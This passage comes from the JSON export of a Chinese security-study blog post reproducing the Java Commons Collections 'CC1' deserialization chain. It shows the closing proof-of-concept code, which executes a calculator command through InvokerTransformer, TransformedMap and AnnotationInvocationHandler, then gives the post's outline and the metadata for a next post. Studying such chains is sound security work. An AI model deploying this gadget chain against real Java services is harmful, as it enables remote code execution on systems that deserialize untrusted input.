objectInputStream<span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        fileInputStream<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        objectInputStream<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">NoSuchMethodException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">IllegalAccessException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ClassNotFoundException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">InvocationTargetException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">InstantiationException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> objectObjectHashMap <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        objectObjectHashMap<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"value\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">InvokerTransformer</span> <span class=\"token class-name\">Invoker</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"StringA\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"hello world!\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">ChainedTransformer</span> chainedTransformer <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ChainedTransformer</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getMethod\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"getRuntime\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"invoke\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exec\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"open -a Calculator\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> aClass <span class=\"token operator\">=</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sun.reflect.annotation.AnnotationInvocationHandler\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Constructor</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> declaredConstructor <span class=\"token operator\">=</span> aClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredConstructor</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Annotation</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Map</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Map</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> decorate <span class=\"token operator\">=</span> <span class=\"token class-name\">TransformedMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">decorate</span><span class=\"token punctuation\">(</span>objectObjectHashMap<span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> chainedTransformer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        declaredConstructor<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Object</span> o <span class=\"token operator\">=</span> declaredConstructor<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Target</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> decorate<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Main<span class=\"token punctuation\">.</span>Serialize</span><span class=\"token punctuation\">(</span>o<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Main<span class=\"token punctuation\">.</span>UnSerialize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n","feature":true,"text":"JAVA的CC1是一直复现一直复现反反复复，这里就复现完了就进行记录。 复现：漏洞点（InvokerTransformer-&gt;transform）public InvokerTransformer(String methodName, Class[] paramTypes,...","link":"","photos":[],"count_time":{"symbolsCount":"13k","symbolsTime":"12 mins."},"categories":[],"tags":[{"name":"JAVA安全","slug":"JAVA安全","count":1,"path":"api/tags/JAVA安全.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%A4%8D%E7%8E%B0%EF%BC%9A\"><span class=\"toc-text\">复现：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E7%82%B9%EF%BC%88InvokerTransformer-gt-transform%EF%BC%89\"><span class=\"toc-text\">漏洞点（InvokerTransformer-&gt;transform）</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%B0%83%E7%94%A8%E6%A0%881%EF%BC%9A%EF%BC%88TransformedMap-gt-checkValue%EF%BC%89\"><span class=\"toc-text\">调用栈1：（TransformedMap-&gt;checkValue）</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%B0%83%E7%94%A8%E6%A0%882%EF%BC%9AAbstractInputCheckedMapDecorator-setValue\"><span class=\"toc-text\">调用栈2：AbstractInputCheckedMapDecorator::setValue</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%86%85%E9%83%A8%E8%B0%83%E7%94%A8%E6%A0%881%EF%BC%9AsetValue%E5%AE%9E%E7%8E%B0%E4%BA%86Map-Entry\"><span class=\"toc-text\">内部调用栈1：setValue实现了Map.Entry</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%86%85%E9%83%A8%E8%B0%83%E7%94%A8%E6%A0%882%EF%BC%9A%E9%9D%99%E6%80%81%E5%86%85%E7%BD%AE%E7%B1%BB%EF%BC%88EntrySetIterator-next%EF%BC%89\"><span class=\"toc-text\">内部调用栈2：静态内置类（EntrySetIterator::next）</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%86%85%E9%83%A8%E8%B0%83%E7%94%A8%E6%A0%883%EF%BC%9A%E5%86%85%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BBEntrySet-iterator%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">内部调用栈3：内部调用类EntrySet::iterator方法</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%86%85%E9%83%A8%E8%B0%83%E7%94%A8%E6%A0%884%EF%BC%9A%E5%86%85%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB-AbstractInputCheckedMapDecorator-entryset\"><span class=\"toc-text\">内部调用栈4：内部调用类(AbstractInputCheckedMapDecorator::entryset)</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%80%BB%E7%BB%93%E5%86%85%E9%83%A8%E8%B0%83%E7%94%A8%E6%A0%882%EF%BC%9A\"><span class=\"toc-text\">总结内部调用栈2：</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%B0%83%E7%94%A8%E6%A0%883%EF%BC%9AAnnotationInvocationHandler-readObject\"><span class=\"toc-text\">调用栈3：AnnotationInvocationHandler::readObject</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%86%85%E9%83%A8%E8%B0%83%E7%94%A8%E6%A0%881%EF%BC%9AAnnotationType-getInstance\"><span class=\"toc-text\">内部调用栈1：AnnotationType.getInstance</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%86%85%E9%83%A8%E8%B0%83%E7%94%A8%E6%A0%882%EF%BC%9AAnnotationType-AnnotationType%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">内部调用栈2：AnnotationType::AnnotationType构造方法</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E8%B0%83%E7%94%A8%E6%A0%883%EF%BC%9AreadObject%EF%BC%88440%E8%A1%8C%EF%BC%89%E2%80%93-gt-annotationType-memberTypes\"><span class=\"toc-text\">调用栈3：readObject（440行）–&gt; annotationType.memberTypes</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#readObject%E7%9A%84%E9%81%8D%E5%8E%86\"><span class=\"toc-text\">readObject的遍历</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#Runtime-class%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%97%AE%E9%A2%98\"><span class=\"toc-text\">Runtime.class的反序列化问题</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%9C%80%E5%90%8E%E9%93%BE%E5%AD%90\"><span class=\"toc-text\">最后链子</span></a></li></ol></li></ol></li></ol></li></ol>","author":{"name":"Q16G","slug":"blog-author","avatar":"https://www.helloimg.com/images/2023/05/23/oJaeo5.jpg","link":"/","description":"一个潜心学习网络安全的大学生","socials":{"github":"https://github.com/Q16G","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_57222016?spm=1018.2226.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{},"next_post":{"title":"字节序列问题","uid":"67ca9e91ec24db55ca87af66a3ba205d","slug":"字节序列问题","date":"2023-06-19T02:20:29.000Z","updated":"2023-06-23T07:47:41.984Z","comments":true,"path":"api/articles/字节序列问题.json","keywords":null,"cover":null,"text":"字节序的问题上次在内网穿透已经提到，字节序分为大端和小端，由于不同的芯片造成了不同的字节序列，例如X86是小端存储，System&#x2F;370，SPARC是大端存储，ARM是可以配置的。 引入不同地区和不同地区的人之间是存在方言的，同一地区由于方言相同，就可以完全通信，但是如...","link":"","photos":[],"count_time":{"symbolsCount":"1k","symbolsTime":"1 mins."},"categories":[],"tags":[{"name":"开发","slug":"开发","count":3,"path":"api/tags/开发.json"}],"author":{"name":"Q16G","slug":"blog-author","avatar":"https://www.helloimg.com/images/2023/05/23/oJaeo5.jpg","link":"/","description":"一个潜心学习网络安全的大学生","socials":{"github":"https://github.com/Q16G","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_57222016?spm=1018.2226.3001.5343","juejin":"","customs":{}}},"feature":true}}